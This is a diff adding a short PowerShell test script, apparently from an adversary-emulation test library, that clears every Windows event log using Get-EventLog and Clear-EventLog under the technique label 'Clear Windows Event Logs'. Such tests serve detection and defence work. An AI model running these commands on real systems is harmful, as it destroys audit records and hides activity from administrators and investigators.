@@ -1,0 +1,9 @@
+#TechniqueName: Indicator Removal on Host: Clear Windows Event Logs
+#AtomicTestName: Delete System Logs Using Clear-EventLog
+#Language: ps1
+
+#commands
+$logs = Get-EventLog -List | ForEach-Object {$_.Log}
+$logs | ForEach-Object {Clear-EventLog -LogName $_ }
+Get-EventLog -list
+
